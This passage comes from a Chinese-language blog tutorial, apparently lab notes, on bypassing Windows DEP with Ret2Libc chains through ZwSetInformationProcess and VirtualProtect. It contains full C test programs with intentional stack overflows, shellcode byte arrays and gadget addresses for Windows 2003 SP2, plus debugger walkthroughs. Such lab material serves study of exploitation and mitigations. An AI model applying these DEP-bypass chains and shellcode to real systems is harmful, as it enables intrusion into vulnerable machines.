EBP RETN 指令需要放在 <code>mov al,1</code> 之后，在关闭 DEP 之前。而不影响关闭 DEP 的寄存器只有 ESP，所以选择 PUSH ESP POP EBP RETN 指令序列。</p><p><strong>（3）消除 EBP-4 被冲刷影响，修正 EBP</strong></p><p>现在还有一个严重的问题，直接将 ESP 的值赋给 EBP 返回后， ESP 相对 EBP 位于高址位置，当有入栈操作时 EBP-4 处的值可能会被冲刷掉，进而影响传入 ZwSetInformationProcess 的参数，造成 DEP 关闭失败。我们先用 0x5D1D8B85 处的 PUSH ESP POP EBP RET 4 指令来修正 EBP，然后调试根据堆栈情况来消除 EBP-4 被冲刷的影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>重新编译程序后调试，在 0x7C95683B 处（CALL ZwSetInformationProcess）下断点，待程序中断后观察堆栈情况。如下图所示，EBP-4 中的内容已经被覆盖为 0x22，根据_KEXECUTE_OPTIONS 结构我们知道 DEP 只和结构中的前 4 位有关，只要前 4 位的二进制代码为 0100 就可关闭 DEP，而 0x22（00100010）刚刚符合这个要求，所以用 0x22 冲刷掉 EBP-4 处的值还是可以关闭 DEP 的。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/../Blog_rgzz/source/_posts/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620081243474.png" alt="image-20220620081243474"></p><p>虽然我们已经关闭了 DEP，但是我们失去了进程的控制权。我们再来看看关闭 DEP 后程序返回时堆栈的情况。单步运行到 0x7C93CD6F 处（retn 4），发现 ESP 指向 0x0012FE70，此处值为 0x00000004，它就是关闭 DEP 时 PUSH 4 的结果，现在我们无法转入 shellcode 执行了，所以我们还需要对 ESP 或者 EBP 进行调整。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620082759710-16562939498349.png" alt="image-20220620082759710"></p><p><strong>（4）夺回程序控制权</strong></p><p>ESP 值小于 EBP 时，防止入栈时破坏当前栈内容的调整方法就是减小 ESP和增大 EBP。由于 shellcode 位于内存低址，所以减小 ESP 会破坏 shellcode，而增大 EBP 的指令在本次实验中无法找到。一个变通方法是增大 ESP 到一个安全的位置，让 EBP 和 ESP 之间的空间足够大，这样关闭 DEP 过程中的压栈操作就无法冲刷到 EBP 的范围内了。</p><p>我们可以使用带有偏移量的 RETN 指令来增大 ESP，如 RETN 0x28 等指令可以执行 RETN 指令后再将 ESP 增加 0x28 个字节。我们可以通过 OllyFindAddr 插件中的 Overflow return address --&gt; POP RETN+N 选项来查找相关指令。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620084553195-16556859539081-165629394983410.png" alt="image-20220620084553195"></p><p>在选取指令时，不能对 ESP 和 EBP 有直接操作。否则会无法跳回 shellcode 执行。选择 0x7C974A19 处的 RETN 28，来增大 ESP。在关闭 DEP 前加入增大 ESP 指令地址。注意：修正 EBP 指令返回时带有的偏移量回影响后续指令，所以我们在布置 shellcode 时需加入相应填充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x19\x4A\x97\x7C&quot;</span> <span class="comment">//增大 ESP</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>在 0x7C93CD6F 处中断程序，建议不要在加载完程序直接在 0x7C93CD6F 中断，先在 0x7C95683B（CALL ZwSetInformationProcess）处下断点，然后单步运行到 0x7C93CD6F，否则您会被中断到崩溃。堆栈情况如下图，增大 ESP 后关键数据没有被破坏。执行完 RETN 0x04 后 ESP 将指向 0x0012FE74，所以我们只要在 0x0012FE70 放置一条 JMP ESP 指令就能让程序转入堆栈执行指令。通过 OllyFindAddr 插件中的 Overflow return address --&gt; Find CALL/JMP ESP 来搜索指令。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620120052278-165629394983411.png" alt="image-20220620120052278"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620121426020-165629394983412.png" alt="image-20220620121426020"></p><p>用 0x7DC5C1B4 处的 JMP ESP，然后在 0x0012FE70 处放一个长跳指令，让程序跳转到 shellcode 的起始位置来执行 shellcode，根据内存状态，可以计算处 0x0012FE74 距离 shellcode 起始位置（0x0012FDB0）有 200 个字节，所以需要回调 205个字节（+5 字节跳转指令长度）。</p><p>布置 shellcode，如下图所示</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620123304414-165629394983413.png" alt="image-20220620123304414"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x19\x4A\x97\x7C&quot;</span> <span class="comment">//增大 ESP</span></span><br><span class="line"><span class="string">&quot;\xB4\xC1\xC5\x7D&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line"><span class="string">&quot;\xE9\x33\xFF\xFF&quot;</span> <span class="comment">//回跳指令</span></span><br><span class="line"><span class="string">&quot;\xFF\x90\x90\x90&quot;</span></span><br></pre></td></tr></table></figure><p>将 shellcode 布置好后重新编译运行，调试，在 0x7C93CD6F 处下断点，然后单步运行，观察 程序执行流程。执行完 JMP ESP 后就能看到程序转入 shellcode。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131557944-165629394983414.png" alt="image-20220620131557944"></p><p>继续运行就能看到对话框了。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620131754734-165629394983415.png" alt="image-20220620131754734"></p><h4 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充：</h4><p>微软在 Windows 2003 SP2 以后对 LdrpCheckNXCompatibility 函数进行了少许修改，对我们影响最大的是该函数在执行过程中会对 ESI 指向的内存附近进行操作。保证 ESI 指向的内存为可写内存，利用类似的指令如 push esp pop esi retn 来调整 ESI，这些指令显示在 OllyFindAddr 插件中 Disable DEP→Disable DEP &gt;=2003 SP2 搜索结果的 step4 部分。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620145822498-165629394983516.png" alt="image-20220620145822498"></p><p>这些指令不好找，这里介绍一种替代方法：</p><p>（ 1）找到 pop eax retn 指令，并让程序转入该位置执行。<br>（ 2）找到一条 pop esi retn 的指令，并保证在执行（ 1）中 pop eax 时它的地址位于栈顶，这样就可以把该地址放到 eax 中。<br>（ 3）找到 push esp jmp eax 指令，并转入执行。<br>这样就相当于执行了 push esp pop esi retn， esi 被指到了可写位置。下边我们给出一种可以在 Windows 2003 SP2 下边成功溢出的代码，大家可以自行调试，感受一下跳板执行选取和 shellcode 布局的思路。代码运行环境为 Windows 2003 SP2 中文版，代码中的各跳板地址可能需要重新调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE9\x77\xBE\x77&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x81\x71\xBA\x7C&quot;</span> <span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span> <span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\x3D\x68\xBE\x7C&quot;</span> <span class="comment">//pop esi retn</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\x9B\xF4\x87\x7C&quot;</span> <span class="comment">//retn 0x30</span></span><br><span class="line"><span class="string">&quot;\x17\xF5\x96\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line"><span class="string">&quot;\x23\x1E\x1A\x7D&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line"><span class="string">&quot;\xE9\x27\xFF\xFF&quot;</span> <span class="comment">//跳转到 shellcode 起始地址</span></span><br><span class="line"><span class="string">&quot;\xFF\x90\x90\x90&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(tt,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ret2libc-实战之利用-virtualprotect"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-virtualprotect"></a> Ret2Libc 实战之利用 VirtualProtect</h3><p>Optout 和 AlwaysON 模式下所有进程是默认开启 DEP，这时如果一个程序自身偶尔需要从堆栈中取指令，则会发生错误。为了解决这个问题微软提供了修改内存属性的 <strong>VirtualProtect 函数</strong>，该函数位于 kernel32.dll 中，该函数可以修改指定内存的属性，包括是否可执行属性。因此只要我们在栈帧中布置好合适的参数，并让程序转入 VirtualProtect 函数执行，就可以将 shellcode 所在内存设置为可执行状态，进而绕过 DEP。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">LPVOID lpAddress,<span class="comment">//要改变属性的内存起始地址。</span></span></span><br><span class="line"><span class="params">DWORD dwSize,<span class="comment">//要改变属性的内存区域大小。</span></span></span><br><span class="line"><span class="params">DWORD flNewProtect,<span class="comment">//内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（ 0x40）时该内存页为可读可写可执行。</span></span></span><br><span class="line"><span class="params">PDWORD lpflOldProtect<span class="comment">//内存原始属性类型保存地址。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//修改内存属性成功时函数返回非 0，修改失败时返回 0。  </span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220620151956530-165629394983517.png" alt="image-20220620151956530"></p><p>[EBP+C]和[EBP+10]这两个参数是固定的，[EBP+8]和[EBP+14]这两个参数是动态确定的，要保证[EBP+8]可以落在我们可以控制的堆栈范围内，[EBP+14]要保证为一可写地址。</p><p>按照如下参数布置好栈帧就可以将 shellcode 所在内存区域设置为可执行模式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">shellcode 所在内存空间起始地址,</span></span><br><span class="line"><span class="params">shellcode 大小,</span></span><br><span class="line"><span class="params"><span class="number">0x40</span>,</span></span><br><span class="line"><span class="params">某个可写地址</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意：<br>（ 1）参数中包含 0x00，strcpy 在复制字符串的时候会被截断，所以我们不能攻击 strcpy 函数，改为攻击 memcpy 函数。<br>（ 2）对 shellcode 所在内存空间起始地址的确定，不同机器之间 shellcode 在内存中的位置可能会有变化，本次实验中我们在栈帧中<strong>构造方法动态确定 shellcode 所在内存空间起始地址。</strong></p></blockquote><hr><h4 id="实验代码-2"><a class="markdownIt-Anchor" href="#实验代码-2"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span> <span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span> <span class="comment">//pop pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span> <span class="comment">//修正 EBP</span></span><br><span class="line">    <span class="string">&quot;\x8B\x17\x84\x7C&quot;</span> <span class="comment">//RETN</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span> <span class="comment">//修改内存大小</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">//可读可写可执行内存属性代码</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span> <span class="comment">//push esp jmp eax</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span> <span class="comment">//修改内存属性</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xA4\xDE\xA2\x7C&quot;</span> <span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,shellcode,<span class="number">420</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路-2"><a class="markdownIt-Anchor" href="#实验思路-2"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。<br>（ 3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualProtect 函数将 shellcode 所在内存区域设置为可执行模式。<br>（ 4）通过 push esp jmp eax 指令序列动态设置 VirtualProtect 函数中的 shellcode 所在内存起始地址以及内存原始属性类型保存地址。<br>（ 5）内存区域被设置成可执行模式后 shellcode 就可以正常执行了。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2003 SP2</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤-2"><a class="markdownIt-Anchor" href="#实验步骤-2"></a> 实验步骤：</h4><p><strong>（ 1）由于溢出时，EBP被覆盖破坏，先修复 EBP（把 ESP赋值给 EBP）</strong></p><p>用 PUSH ESP POP EBP RETN 4 指令的地址（0x77ECE353）覆盖 test 函数的返回地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x53\xe3\xec\x77&quot;</span> <span class="comment">//修正 EBP 77ECE353</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624203825690-165629394983518.png" alt="image-20220624203825690"></p><p>retn  4 返回到 0x0012FE70（ebp+0x8） 处存储的地址（0x00000000）执行，如下图所示</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220624204155092-165629394983519.png" alt="image-20220624204155092"></p><p><strong>（ 2）利用 VirtualProtect 函数将 shellcode 所在内存区域设置为可执行模式</strong></p><ol><li>修改属性的内存地址（ebp+0x8）设置为当前堆栈中的某个地址</li></ol><p>现在我们的目标是动态覆盖掉 ebp+0x14，ebp+0x8，而要保证 ebp+0x10，ebp+0xC不变（由上面的分析可知，ebp+0x10，ebp+0xC 是两个固定参数）。</p><p>现在 ESP 刚好指向 